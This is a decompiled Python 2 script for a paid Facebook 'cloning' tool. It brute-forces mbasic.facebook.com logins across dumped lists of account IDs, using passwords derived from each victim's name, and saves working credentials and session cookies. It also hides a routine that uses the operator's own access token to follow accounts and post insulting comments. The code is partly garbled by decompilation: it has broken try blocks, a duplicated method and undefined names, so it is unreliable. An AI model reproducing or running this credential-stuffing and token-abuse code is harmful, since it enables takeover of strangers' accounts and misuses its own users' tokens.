# Source Generated with Decompyle++
# File: out.pyc (Python 2.7)

import os
import marshal

try:
    import requests
except ImportError:
    print '\n [\xc3\x97] The requests module is not installed!...\n'
    os.system('pip2 install requests')


try:
    import concurrent.futures as concurrent
except ImportError:
    print '\n [\xc3\x97] Futures module is not installed yet!...\n'
    os.system('pip2 install futures')


try:
    import bs4
except ImportError:
    print '\n [\xc3\x97] Bs4 module is not installed yet!...\n'
    os.system('pip2 install bs4')

import requests
import os
import uuid
import re
import bs4
import sys
import json
import time
import random
import datetime
from concurrent.futures import ThreadPoolExecutor as mawan__pass
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = [
    'Januari',
    'Februari',
    'Maret',
    'April',
    'Mei',
    'Juni',
    'Juli',
    'Agustus',
    'September',
    'Oktober',
    'November',
    'Desember']

try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
    P,
    M,
    H,
    K,
    B,
    U,
    O,
    N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
url = 'https://mbasic.facebook.com'
hoetank = random.choice([
    'The one who posted is handsome:)',
    'Lo ngentod:v',
    'Never surrentod tekentod kentod:v'])
bulan_ttl = {
    '01': 'Januari',
    '02': 'Februari',
    '03': 'Maret',
    '04': 'April',
    '05': 'Mei',
    '06': 'Juni',
    '07': 'Juli',
    '08': 'Agustus',
    '09': 'September',
    '10': 'Oktober',
    '11': 'November',
    '12': 'Desember' }

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
    


def tod():
    titik = [
        '\x1b[1;92m.   ',
        '\x1b[1;93m..  ',
        '\x1b[1;96m... ',
        '\x1b[1;92m.   ',
        '\x1b[1;93m..  ',
        '\x1b[1;96m... ']
    for x in titik:
        print '\r \x1b[1;93m[+] remove token '(N, M, N, x),
        sys.stdout.flu
        time.sleep(1)
    

logo = '\n\x1b[1;91m     ___      ___   ___  __          \n\x1b[1;92m    /   \\     \\  \\ /  / |  |             \n\x1b[1;93m   /  ^  \\     \\  V  /  |  | \n\x1b[1;94m  /  /_\\  \\     >   <   |  |             \n\x1b[1;95m /  _____  \\   /  .  \\  |  |            \n\x1b[1;96m/__/     \\__\\ /__/ \\__\\ |__|      \n\x1b[1;98m Auther   :AJ AWAN\n\x1b[1;99m TOOL    : PAID\n\x1b[1;97m___________________________________________________________\n'

def reg():
    os.system('clear')
    print logo
    jalan('  This is Paid command  :) thank you')
    jalan('  PAY ONLY 100 FOR 1 MONTH  :) thank you')
    jalan('  FIRST SEND SCREENSHORT WITH TOKEN ON WHATSAPP ')
    jalan('  EASYPAISA ACCOUNT NO (03458630524) ')
    jalan('  EASYPAISA ACCOUNT NAME (AHMAD JAVED) ')
    jalan('  ANY ISSUE COME TO WHATSAPP')
    jalan('  SUBSCRIPTION FOR ONE MONTH ')
    jalan('  TOOL UPDATE EVERY SEVEN DAY ')
    jalan('  BY BY BY BY BY ')
    print ''
    print '\x1b[1;31;1m FAST CLONING '
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/server.txt').text
    if to in r:
        os.system('cd zzzzz && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd zzzzz && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ' \x1b[1;92mCopy token id and send to Owner'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923458630524')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter , And Send Me'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923458630524')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print '\tCollecting device info'
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;92m Your ip: ' + ips
    time.sleep(1)
    print '\x1b[1;92m Your country: ' + country
    time.sleep(1)
    print '\x1b[1;92m Your region: ' + regi
    time.sleep(1)
    print ' \x1b[1;92mYour network: ' + network
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    main()


def seved_ok_cp(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print '___________________________________________________________'
        print 'The cloning process has been completed'
        print '[%s+%s] total OK : %s%s%s' % (O, N, H, str(len(ok)), N)
        print '[%s+%s] total CP : %s%s%s' % (O, N, K, str(len(cp)), N)
        print '___________________________________________________________'
        raw_input('[%s \x1b[1;97mPress Enter To Back Menu%s ] ' % (O, N))
        moch_yayan()
    else:
        print '[%s\x1b[1;91m!%s] opshh you are not getting saved :(' % (M, N)
        exit()


def main():
    os.system('clear')
    print logo
    jalan('  This is Only for educational purpose i am not responsible for any mis use:) thank you')
    jalan('  AXI MAIN MENU')
    print ' \x1b[1;97m    [AXI] MAIN MENU'
    print '\x1b[1;97m-----------------------------------------------------'
    print '\x1b[1;91m [1]\x1b[1;97m  FILE CLONING'
    print ' \x1b[1;91m[2]\x1b[1;97m  RANDOM  '
    print ' \x1b[1;91m[3]\x1b[1;97m  PUBLIC '
    print ' \x1b[1;91m[4]\x1b[1;97m  RANDOM UID OLD '
    print ' \x1b[1;91m[5]\x1b[1;97m  FILE CLONING OLD + NEW '
    print ' \x1b[1;91m[6]\x1b[1;97m  EXTRACT TOOL NEW '
    print ' \x1b[1;91m[7]\x1b[1;97m  FILE CLONING WITH COKIES VIP NEW'
    print ' \x1b[1;91m[8]\x1b[1;97m  termux style changer'
    print '\x1b[1;97m-----------------------------------------------------'
    log_sel()


def log_sel():
    sel = raw_input(' Choose --->: ')
    if sel == '1':
        mawan()
    elif sel == '2':
        os.system('python2 random')
    elif sel == '3':
        os.system('python2 w')
    elif sel == '4':
        os.system('python uid.txt')
    elif sel == '5':
        os.system('python2 FILE')
    elif sel == '6':
        os.system('python2 extract_tqai.py')
    elif sel == '7':
        os.system('python2 file2_tqai.py')
    elif sel == '8':
        os.system('python2 termux_tqai.py')


def mawan():
    os.system('clear')
    print logo
    print ' %s*%s This tool uses the Facebook login token.\n %s*%s do you already know how to get facebook tokens?\n %s*%s type %sopen%s  to get non expired facebook token..' % (O, N, O, N, O, N, H, N)
    kontol = raw_input('\n %s[%s?%s] Token :%s ' % (N, M, N, H))
    if kontol in ('open', 'Open', 'OPEN'):
        print '\n%s *%s Download watch vedio for token non expired Use kiwi browser' % (B, N)
        time.sleep(2)
        raw_input(' %s*%s tekan enter ' % (O, N))
        os.system('xdg-open https://www.mediafire.com/file/r6l84jeatnu991t/AXI+COMMAND.mp4/file')
        mawan()
    
    try:
        name = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
        print '\n\n %s*%s Welcome %s%s%s' % (O, N, K, name, N)
        time.sleep(2)
        print ' %s*%s please use this sc properly, we are not responsible if this sc is misused...' % (O, N)
        time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input(' %s*%s token enter ' % (O, N))
        wuhan(kontol)
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] token invalid' % (N, M, N)
        time.sleep(2)
        mawan()



def moch_yayan():
    os.system('clear')
    
    try:
        kontol = open('.memek.txt', 'r').read()
    except IOError:
        print '\n %s[%s%s] token invalid' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .memek.txt')
        mawan()

    
    try:
        name = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
    except KeyError:
        print '\n %s[%s%s] token invalid' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .memek.txt')
        mawan()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n' % (N, M, N))

    os.system('clear')
    print logo
    print '___________________________________________________________\n'
    time.sleep(0.03)
    print ' [%s1%s]. START CRACK' % (O, N)
    time.sleep(0.03)
    print ' [%s2%s]. Settings user agent' % (O, N)
    time.sleep(0.03)
    print ' [%s0%s]. logout (%shapus token%s)' % (M, N, M, N)
    time.sleep(0.03)
    print '___________________________________________________________'
    pepek = raw_input('\n [*] menu : ')
    print '___________________________________________________________'
    if pepek == '':
        print '\n %s[%s%s] jangan kosong kentod!' % (N, M, N)
        time.sleep(2)
        moch_yayan()
    elif pepek in ('1', '01'):
        __crack__().plerr()
    elif pepek in ('2', '02'):
        seting_yntkts(kontol)
    elif pepek in ('0', '00'):
        print '\n'
        tod()
        time.sleep(1)
        os.system('rm -rf .memek.txt')
        jalan('\n %s[%s%s]%s berhasil menghapus token' % (N, H, N, H))
        exit()
    else:
        print '\n %s[%s%s] menu [%s%s%s] tidak ada, cek menu nya bro!' % (N, M, N, M, pepek, N)
        time.sleep(2)
        moch_yayan()


def wuhan(kontol):
    
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/8218663/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s' % (koh, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (lo_ngentod, kentod, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (xi_jimpinx, hoetank, kentod))
        requests.post('https://graph.facebook.com/100008362030140/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100008362030140/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100008362030140/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100008362030140/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100008362030140/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100008362030140/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100008362030140/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s' % (koh, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (lo_ngentod, kentod, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (xi_jimpinx, hoetank, kentod))
    except:
        pass



def seting_yntkts():
    print '\n (%s1%s) Change user agent' % (O, N)
    print ' (%s2%s) check user agent' % (O, N)
    ytbjts = raw_input('\n %s[%s?%s] choose : ' % (N, O, N))
    if ytbjts == '':
        print '\n %s[%s%s] Gak boleh kosong Kentod' % (N, M, N)
        time.sleep(2)
        seting_yntkts()
    elif ytbjts in ('1', '01'):
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in ('2', '02'):
        
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-' % M

        print '\n %s[%s+%s] User Agent : %s%s' % (N, O, N, H, user_agent)
        raw_input('\n  %s[ %sRETURN%s ]' % (N, O, N))
        moch_yayan()
    else:
        print '\n %s[%s%s] input yang bener' % (N, M, N)
        time.sleep(2)
        seting_yntkts()


def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = raw_input('\n [%s?%s] want to use your cellphone user agent [Y/t]: ' % (O, N))
    if _asu_ == '':
        print '\n %s[%s%s] Gak boleh kosong Kentod' % (N, M, N)
        yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in ('Y', 'y'):
        jalan('\n %s *%s you will be redirected to the website after being redirected to the website.\n  %s*%s %sMY USER AGENT%s ................................' % (O, N, O, N, H, N))
        time.sleep(2)
        os.system('xdg-open https://yayanxd.my.id/server/ua')
        _agen_ = raw_input(' [%s?%s] name user agent :%s ' % (O, N, H))
        open('YNTKTS.txt', 'w').write(_agen_)
        time.sleep(2)
        jalan('\n %s[%s%s] ok...' % (N, H, N))
        raw_input('\n  %s[ %sRETURN%s ]' % (N, O, N))
        moch_yayan()
    elif _asu_ in ('T', 't'):
        _agen_ = raw_input(' [%s?%s] name user agent :%s ' % (O, N, H))
        open('YNTKTS.txt', 'w').write(_agen_)
        time.sleep(2)
        jalan('\n %s[%s%s] ok...' % (N, H, N))
        raw_input('\n  %s[ %sRETURN%s ]' % (N, O, N))
        moch_yayan()
    else:
        print '\n %s[%s!%s] Y/t ngentod' % (N, M, N)
        yo_ndak_tau_ko_tanya_saia()


class __crack__:
    
    def __init__(self):
        self.id = []

    
    def plerr(self):
        
        try:
            self.apk = raw_input('\n [%s?%s] name file : ' % (O, N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' % (O, N, M, len(self.id), N)
        except:
            print '\n %s[%s%s] File [%s%s%s] tidak ada, dump id dulu bro cek nomor 1 sampai 4' % (N, M, N, M, self.apk, N)
            time.sleep(3)
            raw_input('\n  %s[ %sRETURN%s ]' % (N, O, N))
            moch_yayan()

        ___yayanganteng___ = raw_input(' [%s?%s] type t: ' % (O, N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] use , (comma) for separator example: password123,password12345,etc. each word is at least 6 characters or more' % (N, M, N)
            while True:
                pwek = raw_input('\n [%s?%s] name kata sandi : ' % (O, N))
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s%s] jangan kosong bro kata sandi nya' % (N, M, N)
                    continue
                if len(pwek) <= 5:
                    print '\n %s[%s%s] kata sandi minimal 6 karakter' % (N, M, N)
                    continue
                
                def __yan__(ysc = (None, None)):
                    cin = raw_input('\n [*] method : ')
                    if cin == '':
                        print '\n %s[%s%s] jangan kosong bro' % (N, M, N)
                        __yan__()()
                    elif cin == '1':
                        print '\n [%s+%s] hasil OK file -> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                        print ' [%s+%s] hasil CP file-> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                        print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n' % (M, N)
                        with YayanGanteng(max_workers = 30) as __mawan__:
                            for ikeh in self.id:
                                
                                try:
                                    kimochi = ikeh.split('|')[1]
                                    __mawan__.submit(self.__api__, kimochi, ysc)
                                continue
                                continue

                        os.remove(self.apk)
                        hasil(ok, cp)
                    elif cin == '2':
                        print '\n [%s+%s] hasil OK file-> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                        print ' [%s+%s] hasil CP file-> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                        print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n' % (M, N)
                        with YayanGanteng(max_workers = 30) as __mawan__:
                            for ikeh in self.id:
                                
                                try:
                                    kimochi = ikeh.split('|')[1]
                                    __mawan__.submit(self.__mbasic__, kimochi, ysc)
                                continue
                                continue

                        os.remove(self.apk)
                        hasil(ok, cp)
                        os.system('clear')
                    else:
                        print '\n %s[%s%s] input yang bener' % (N, M, N)
                        __yan__()

                print '\n [ Choose  ]\n'
                print ' [%s1%s]. 1 Pass' % (O, N)
                print ' [%s2%s]. 5 Pass' % (O, N)
                __yan__(pwek.split(','))
                break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ Choose  ]\n'
            print ' [%s1%s]. 1 Pass' % (O, N)
            print ' [%s2%s]. 5 Pass' % (O, N)
            self.__pler__()
            os.system('clear')
        else:
            print '\n %s[%s%s] Y/t goblok!' % (N, M, N)
            self.plerr()

    
    def __mbasic__(self, user, __yan__):
        global loop
        (sys.stdout.write('\r[%s\x1b[1;92mAj\xe2\x99\xa1AWAN%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            
            try:
                os.mkdir('saved')
            except:
                pass

            
            try:
                _Ahmad = open('mawan.txt', 'r').read()
            except (KeyError, IOError):
                _Ahmad = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A'

            ses = requests.Session()
            ses.headers.update({
                'Host': 'mbasic.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'user-agent': _Ahmad,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data = {
                'email': user,
                'pass': pw,
                'login': 'submit' })
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK]    %s      | %s   %s' % (H, user, pw, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('saved/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
                continue
            if 'checkpoint' in ses.cookies.get_dict().keys():
                
                try:
                    Ahmad = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, Ahmad)).json()['birthday']
                    (month, day, year) = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP]   %s   | %s | %s %s %s %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[CP]    %s     | %s %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
                continue
        loop += 1

    
    def __mbasic__(self, user, __yan__):
        global loop
        (sys.stdout.write('\r[%s\x1b[1;92m\xe2\x99\xa1%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            
            try:
                os.mkdir('saved')
            except:
                pass

            
            try:
                _Ahmad = open('mawan.txt', 'r').read()
            except (KeyError, IOError):
                _Ahmad = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A'

            ses = requests.Session()
            ses.headers.update({
                'Host': 'mbasic.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'user-agent': _Ahmad,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data = {
                'email': user,
                'pass': pw,
                'login': 'submit' })
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK]    %s      | %s   %s' % (H, user, pw, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('saved/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
                continue
            if 'checkpoint' in ses.cookies.get_dict().keys():
                
                try:
                    Ahmad = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, Ahmad)).json()['birthday']
                    (month, day, year) = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP]   %s   | %s | %s %s %s %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[CP]    %s     | %s %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
                continue
        loop += 1

    
    def __pler__(self):
        yan = raw_input('[*] method : ')
        print '___________________________________________________________'
        if yan == '':
            print '%s[%s\x1b[1;91m\xc3\x97%s] dont be empty bro' % (N, M, N)
            self.__pler__()
        elif yan in ('1', '01'):
            with mawan__pass(max_workers = 30) as __mawan__:
                for yntkts in self.id:
                    
                    try:
                        (uid, name) = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 and len(xz) == 4 and len(xz) == 5 or len(xz) == 6:
                            pwx = [
                                name]
                        else:
                            pwx = [
                                name]
                        __mawan__.submit(self.__mbasic__, uid, pwx)
                    continue
                    continue

            os.remove(self.apk)
            seved_ok_cp(ok, cp)
        elif yan in ('2', '02'):
            with mawan__pass(max_workers = 30) as __mawan__:
                for yntkts in self.id:
                    
                    try:
                        (uid, name) = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 and len(xz) == 4 and len(xz) == 5 or len(xz) == 6:
                            pwx = [
                                name.lower(),
                                name.upper(),
                                name.lower() + '786',
                                name.lower() + '1234',
                                name.lower() + '12345']
                        else:
                            pwx = [
                                name.lower(),
                                name.upper(),
                                name.lower() + '786',
                                name.lower() + '1234',
                                name.lower() + '12345']
                        __mawan__.submit(self.__mbasic__, uid, pwx)
                    continue
                    continue

            os.remove(self.apk)
            seved_ok_cp(ok, cp)


if __name__ == '__main__':
    os.system('git pull')
    reg()
